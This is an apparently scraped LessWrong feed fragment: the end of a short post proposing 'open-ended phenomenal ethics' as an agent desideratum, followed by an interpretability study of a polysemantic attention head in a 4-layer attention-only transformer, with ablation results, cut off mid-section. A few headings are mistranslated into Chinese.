]]></title><description><![CDATA[Published on November 9, 2023 4:58 PM GMT<br/><br/><p> <i>This is a short version of</i> <a href="https://www.lesswrong.com/posts/K3m8K8JEweLZmGgv8/open-ended-ethics-of-phenomena-a-desiderata-with-universal"><i>the more complete post</i></a><br><br><br> I formulate a desiderata/procedure (called &quot;phenomenal ethics&quot; or &quot;open-ended ethics&quot;) :</p><p> Expanding the action space and autonomy of a maximum of phenomenons (enhancing ecosystemic values, and the means to reach/understand options), modulated by variables mitigating frantic optimizations (to respect natural evolving rates etc).</p><p>​ ​​<br></p><p>Utilitarianism based on well-being demands to define well-being,<br> It demands to maximize happiness, but what is happiness?<br> The classical issues arise : amorphous pleasure, wireheading, drug addiction etc.<br> We need to find a tractable desiderata securing actions in an adequate value space.</p><p></p><p> I argue that the production of &quot;well-being&quot; is intrinsic to phenomenal/open-ended ethics. An ideal enactment of such procedure inherently maximizes the possibility of anyone/anything to do as they will; if *what they will* enhances the possibility of other &#39;things&#39; to do *as they will* as well.</p><p> As a concept it&#39;s quite elementary, but <i>how to compute it properly</i> ?</p><p> The <a href="https://www.lesswrong.com/posts/bebw3SEjXY3SCAcwD/clarifying-the-free-energy-principle-with-quotes">free energy principle</a> seems to be a good path forward.<br><br><br> The aim is to provide affordance, access to adjacent possibles, allow phenomena, ecosystems and individuals to bloom, develop diversity in as many dimensions as possible. I include in the desiderata phenomena that aren&#39;t considered alive, any physical event is included (which is why I call it &quot; <a href="https://www.lesswrong.com/posts/K3m8K8JEweLZmGgv8/open-ended-ethics-of-phenomena-a-desiderata-with-universal"><u>phenomenal ethics</u></a> &quot;)<br><br> An agent (human/AI/AGI/ASI etc.) has to enhance the autonomy and available actions of existing &quot;behaviors&quot; (phenomenon/environment/agents etc.), which implies selecting out behaviors that aren&#39;t causally beneficial to other behaviors (ecosystemic well-being).</p><p></p><p> Frantic transformation of everything in order to hunt new dimensions of possibilities is to be avoided, so we need to relativize the desiderata with other constraints added to the equation, (those parameters aren&#39;t absolute but variables for value attribution) :<br><br></p><p> Existing phenomena is prioritized over potential phenomena</p><p> The intensity of impact of actions has to be minimized the higher uncertainty is</p><p> Phenomena untainted by AI&#39;s causal power are prioritized over phenomena tainted by it</p><p> Normal rates of change are to be prioritized over abnormal ones</p><p> More care is to be given to phenomena in qualia&#39;s continuum<br><br></p><br/><br/> <a href="https://www.lesswrong.com/posts/iKLnEoYujBiGWvb5F/open-ended-phenomenal-ethics-tltr#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/iKLnEoYujBiGWvb5F/open-ended-phenomenal-ethics-tltr<guid ispermalink="false"> iKLnEoYujBiGWvb5F</guid><dc:creator><![CDATA[Ryo ]]></dc:creator><pubDate> Thu, 09 Nov 2023 22:08:21 GMT</pubDate> </item><item><title><![CDATA[Polysemantic Attention Head in a 4-Layer Transformer]]></title><description><![CDATA[Published on November 9, 2023 4:16 PM GMT<br/><br/><p> <i>Produced as a part of MATS Program, under</i> <a href="https://www.lesswrong.com/users/neel-nanda-1?mention=user"><i>@Neel Nanda</i></a> <i>and</i> <a href="https://www.lesswrong.com/users/lee_sharkey?mention=user"><i>@Lee Sharkey</i></a> <i>mentorship</i></p><p> <i><strong>Epistemic status:</strong> optimized to get the post out quickly, but we are confident in the main claims</i></p><p> <strong>TL;DR:</strong> head 1.4 in attn-only-4l exhibits many different attention patterns that are all relevant to model&#39;s performance</p><h1>介绍</h1><ul><li>In <a href="https://www.alignmentforum.org/posts/u6KXXmKFbXfWzoAXn/a-circuit-for-python-docstrings-in-a-4-layer-attention-only"><u>previous post</u></a> <u>about the docstring circuit</u> , we found that attention head 1.4 (Layer 1, Head 4) in a <a href="http://neelnanda.io/toy-models"><u>4-layer attention-only transformer</u></a> would act as either a fuzzy previous token head or as an induction head <i>&nbsp;</i> in different parts of the prompt.</li><li> These results suggested that attention head 1.4 was polysemantic, ie performing different functions within different contexts.</li><li> In <a href="https://docs.google.com/document/d/1n8hRb7BJ56A5FHmp2juOPfUx0mLKpfgN0AQ2mGgjBwQ/edit#heading=h.u1nl0a7uv3fb"><u>Section 1</u></a> , we classify ~5 million rows of attention patterns associated with 5,000 prompts from the model&#39;s training distribution. In doing so, we identify many more simple behaviours that this head exhibits.</li><li> In <a href="https://docs.google.com/document/d/1n8hRb7BJ56A5FHmp2juOPfUx0mLKpfgN0AQ2mGgjBwQ/edit#heading=h.t868tn88rfdc"><u>Section 2</u></a> , we explore 3 simple behaviours (induction, fuzzy previous token, and bigger indentation) more deeply. We construct a set of prompts for each behaviour, and we investigate its importance to model performance.</li><li> This post provides evidence of the complex role that attention heads play within a model&#39;s computation, and that simplifying an attention head to a simple, singular behaviour can be misleading.</li></ul><h1> Section 1</h1><h2> Methods</h2><ul><li> We uniformly sample 5,000 prompts from the model&#39;s training dataset of <a href="https://huggingface.co/datasets/NeelNanda/c4-tokenized-2b"><u>web text</u></a> and <a href="https://huggingface.co/datasets/NeelNanda/code-tokenized"><u>code</u></a> .</li><li> We collect approximately 5 million individual rows of attention patterns corresponding to these prompts, ie. rows from the head&#39;s attention matrices that correspond to a single destination position.</li><li> We then classify each of these patterns as (a mix of) simple, salient behaviours.</li><li> If there is a behaviour that accounts for at least 95% of a pattern, then it is classified. Otherwise we refer to it as unknown (but there is a multitude of consistent behaviours that we did not define, and thus did not classify)</li></ul><h2>结果</h2><h3>Distribution of behaviours </h3><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/wgregmh64yznab1dvlek" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/mrklvjyq8nzwf19w0qju 170w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/sstzlimz8qbpznfzkmxo 340w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/nlo3kvssczdlt4qjip6j 510w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/runh4uvykdbs3e4qznb4 680w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/jdte1zbdkzutzxrfplpl 850w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/z8lawe2wmbngpnzq0b06 1020w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/rng0ghstyopvtiicxuor 1190w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/yco5knc51unuiaioeeku 1360w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/xpcg423cxvb6jhjfxbc7 1530w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/kxtagrpyovu1nq53antm 1662w"><figcaption> Figure 1: Distribution of attentional behaviours across training distribution (all), and for specific destination tokens.</figcaption></figure><ul><li> In Figure 1 we present results of the classification, where &quot;all&quot; refers to &quot;all destination tokens&quot; and other labels refer to specific destination tokens.</li><li> Character <code>·</code> is for a space, <code>⏎</code> for a new line, and labels such as <code>⏎[·×K]</code> mean &quot; <code>\n</code> and K spaces&quot;.</li><li> We distinguish the following behaviours:<ul><li> previous: attention concentrated on a few previous tokens</li><li> inactive: attention to BOS and EOS</li><li> previous+induction: a mix of previous and basic induction</li><li> unknown: not classified</li></ul></li><li> Some observations:<ul><li> Across all the patterns, previous is the most common behaviour, followed by inactive and unknown.</li><li> A big chunk of the patterns (unknown) were not automatically classified. There are many examples of consistent behaviours there, but we do not know for how many patterns they account.</li><li> Destination token does not determine the attention pattern.</li><li> <code>⏎[·×3]</code> and <code>⏎[·×7]</code> have basically the same distributions, with ~87% of patterns not classified</li></ul></li></ul><h3> Prompt examples for each destination token</h3><p> <strong>Token:</strong> <code>⏎[·×3]</code><br> <strong>Behaviour:</strong> previous+induction </p><h3><img style="width:49.72%" src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/gyw1pqf767ifz7iycxrv" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/x4bhcnubuwiajbazgapd 142w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/w3l7fwkm1c5j7yblbzpa 222w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/msa7fhepz4scukzqiio3 302w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/uffm4d5t0aisqowvaiem 382w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/f836aslwrpniyxgn4byx 462w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ifygllctrh7zrt843lej 542w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/tdjtpwjllpw85xb4ajud 622w"><img></h3><p> There are many ways to understand this pattern, there is likely more going on than simple previous and induction behaviours.</p><p> <strong>Token:</strong> <code>·R</code><br> <strong>Behaviour:</strong> inactive </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/xnkmc5cqkua6rcqbz0cr" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/od2iglyfj0z3tdqv5l8s 100w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/lrrwnndq8bye5vqnjlou 200w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/meaahw8lhkpuavuljssk 300w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/res8grlb2m0xzlpbxy8j 400w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/jirunmkji8cg4feswrez 500w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/de5ddkjdgzvujowtj6h5 600w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/q0efoasstgqvuptt3moy 700w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/glrp6cwxxvyxa1szxezl 800w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/c94ewuljsd8o11cyfz9l 900w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/bjnlet4e6iaymhr15pfc 958w"></figure><p> <strong>Token:</strong> <code>⏎[·×7]</code><br> <strong>Behaviour:</strong> unknown </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/aei4g5amwdgpq8atafxs" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/adcant87dfc3z2ofbkvg 160w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/eqolxewvj2bucspkwjh1 320w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/rtsaltew6jjzqzpw87fq 480w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/x9kxkmcny7ugbcbflky5 640w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/w6e1gvmghywlvx4jiij4 800w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/csx2qqlzjop30letp1bp 960w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/bgxrjdd7zxjkyqbzvjwt 1120w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/mbvmhl0ew1ghjjkres1v 1280w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/xvukcqhsr0s7enrmrqgg 1440w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/xtkt2wmhvsrja7owlqho 1572w"></figure><p> This is a very common pattern, where attention is paid from &quot;new line and indentation&quot; to &quot;new line and bigger indentation&quot;. We believe it accounts for most of what classified as unknown for <code>⏎[·×7]</code> and <code>⏎[·×3]</code> .</p><p> <strong>Token:</strong> <code>width</code><br> <strong>Behaviour:</strong> unknown </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/lmsfzwmhsule0euczuxx" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/xrneefskja2pywczbp9u 140w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/fwtwahwi9vamx8j7sotz 280w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/k0tgvprtuktne4bzx2au 420w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/vhz0t6qxgfwoyoao2arj 560w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/r9s2kigywprl0xfwzz8k 700w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ryv5afxodobznksn82ni 840w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/yjbuzkq2kdahkekktwtd 980w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/xtd7mrqh2wtw8u7ksfjq 1120w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/bqur0ssbakonwfybefsd 1260w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/m6k3s8hkjiltwsvkhe8y 1358w"></figure><p> We did not see many examples like this, but looks like attention is being paid to recent tokens representing arithmetic operations.</p><p> <strong>Token:</strong> <code>dict</code><br> <strong>Behaviour:</strong> previous </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/i2l5oylj7hedt6iulyem" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/r8qahrwksvjzfkn5m7od 120w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ibogftgpkf9vjb5colmx 240w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/w0qyk8dsiwonw8xwnkjs 360w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/hacpsguyteeg3h5fbubl 480w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/kuyjqhkta2qme1chgjbs 600w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/lqfgyi7ot21hi7jcxuk6 720w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/s5igm1o5xks7zxkuw9fs 840w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ecxa7ukmlhxoria8fgwc 960w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ynb8t46sobgne3vtu2ta 1080w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/j6yuy8drshsurokn9sth 1164w"></figure><p> Mostly previous token, but <code>·collections</code> gets more than <code>.</code> and <code>default</code> , which points at something more complicated.</p><h1> Section 2</h1><h2> Methods</h2><ul><li> We select a few behaviours and construct prompt templates, to generate multiple prompts on which these behaviours are exhibited.</li><li> We measure how often the model is able to predict what we consider an obvious next token.</li><li> We ablate the attention pattern of head 1.4, by replacing it with a pattern that attends only to BOS. We do this for each destination position in the prompt.</li></ul><h2> Prompt templates</h2><p> To demonstrate the behaviours, we set up three distinct templates, wherein each template is structured to be as similar as possible to code examples found within the training dataset.</p><h3>就职</h3><p>The dataset for demonstrating <i>induction behaviour</i> is 120 prompts of the following structure: <br><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ojevhlatzaprkwpbl0ac" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ihqh1vxpb3mjegd8qmmb 110w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/h8vbmxjwr68fjfjmvswp 220w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/hxc2ul0u3ouvale2jorv 330w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/uqw2myk1loxypr12ssdg 440w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/dhsujpoei3rgmp0ejmtj 550w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/bfqf4xsj9m7z7hpygwp0 660w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/j5x0jaafmntzu9vpqowl 770w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/jojl7l6iyuacrhbd3olu 880w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/rt0fykf70lorckto3pkp 990w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/j1odyvedxr9i6n0lx9bz 1082w"></p><p> The current position is highlighted orange, attention head 1.4 attends heavily to the token immediately after an earlier copy of the orange token (the red token). The correct next token here is highlighted green. The dataset is generated with three distinct pairs of red and green tokens and many variants of blue and indentation tokens.</p><h3> Bigger indentation</h3><p> The dataset for demonstrating <i>similar indentation token</i> behaviour is 50 prompts of the following structure: </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/q4r42t98rz6pumkwiaxc" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/tr75m7lkobqgiwi7edrb 110w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/oh9l0bhypz8qwpxi4rey 220w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/uttldkfsyqrqj0nhibvg 330w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/cjojrfvs2p5xjcyciv5c 440w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/s6lo5oyo3wbhe9t12adj 550w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/jvquqt48sshjwbktqkck 660w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/odlbmzvosycxq5sktxdx 770w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ojo56n6nowtzqthvex86 880w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/gxbsrljpkdv82bqqnet1 990w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/qnssfoxhmfkijxitu4zx 1082w"></figure><p> The current position is highlighted orange, attention head 1.4 attends heavily to a similar token (the red token) exhibiting <i>similar indentation token</i> behaviour. The correct next token here is highlighted green. The dataset is generated by taking random variable names for the blue tokens.</p><h3>以前的</h3><p>The dataset for demonstrating <i>fuzzy previous token behaviour</i> is 50 prompts of the following structure: </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/tdcrfybo8hpqln2uwsyp" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/evuglhneyn3dkiftoqou 110w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/wx3z7i9ajqnyc1hodsce 220w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/otm1noprmgnjgilcgkfm 330w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/k1j0h798ikmutqv9jmn8 440w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/f7geduauep5paq08snzo 550w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/uavyedwcsduebioz5dwa 660w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/tbahrvtqrjgrreypbtuy 770w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/a7c59m97jsjcuykfmwls 880w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ilzqxljquh9wld3vqcmv 990w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/h1atdmmpvhzkyzgf9kfo 1082w"></figure><p> Again, the current position is highlighted orange, attention head 1.4 attends heavily to the previous token (the red token) acting as a previous token head. The correct next token here is highlighted green. The dataset is generated by taking random variable names for the blue tokens (of which the off-blue represents the fact that there are two tokens in the prompt definition, a parent class and child class name) There are 4 random tokens being used to generate a prompts, 2 for the class name, one for the parent class and one for the init argument.</p><h2>结果</h2><h3>就职</h3><p>We start by studying the importance of attention head 1.4 on the aforementioned induction task (an example presented below). </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ojevhlatzaprkwpbl0ac" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ihqh1vxpb3mjegd8qmmb 110w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/h8vbmxjwr68fjfjmvswp 220w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/hxc2ul0u3ouvale2jorv 330w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/uqw2myk1loxypr12ssdg 440w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/dhsujpoei3rgmp0ejmtj 550w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/bfqf4xsj9m7z7hpygwp0 660w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/j5x0jaafmntzu9vpqowl 770w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/jojl7l6iyuacrhbd3olu 880w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/rt0fykf70lorckto3pkp 990w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/j1odyvedxr9i6n0lx9bz 1082w"></figure><p> In this prompt template, we BOS-ablate the orange token (in this particular example, the <code>⏎···</code> token) when doing the forward pass for the corrupted run. In the clean run, we see that over the 120 dataset examples, 93% have the correct next token (the green token) as the top-predicted token, this is compared to 25% on the corrupted run. The same is true for the mean probability of the correct token in each dataset example, it&#39;s 0.28 on the clean run and 0.09 on the corrupted run. </p><figure class="table"><table><tbody><tr><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"></td><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"><p> % of correct top prediction</p></td><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"><p> mean probability of correct prediction </p></td></tr><tr><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p>clean </p></td><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 93% </p></td><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 0.28 </p></td></tr><tr><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p>ablated </p></td><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 25% </p></td><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 0.09</p></td></tr></tbody></table></figure><p> We now explore what effect BOS-ablation has on other sequence positions, we intend to see whether BOS-ablation has a similarly large effect on these other sequence positions. For clarity we measure average effect across the 120 prompts in the plot below, but only display a single example on the x-axis. </p><figure class="image image_resized" style="width:80.54%"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/hqypdx8sfokokfvqywou"></figure><p><br></p><p> The line plot above indicates that performing BOS-ablation on other positions (besides the orange token) is not associated with a large decrease in the probability assigned to the correct answer (&lt; 5 percentage point drop in probability). In the case of the BOS-ablating the orange token position however, where attention head 1.4 is acting as an induction head, the probability assigned to the correct answer (the green tokens across the dataset distribution) decreases by approximately 20 percentage points.</p><h3> Bigger indentation</h3><p> We move onto understanding the importance of similar indentation token behaviour performed by attention head 1.4 on the corresponding dataset, an example presented below. </p><p><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/q4r42t98rz6pumkwiaxc" 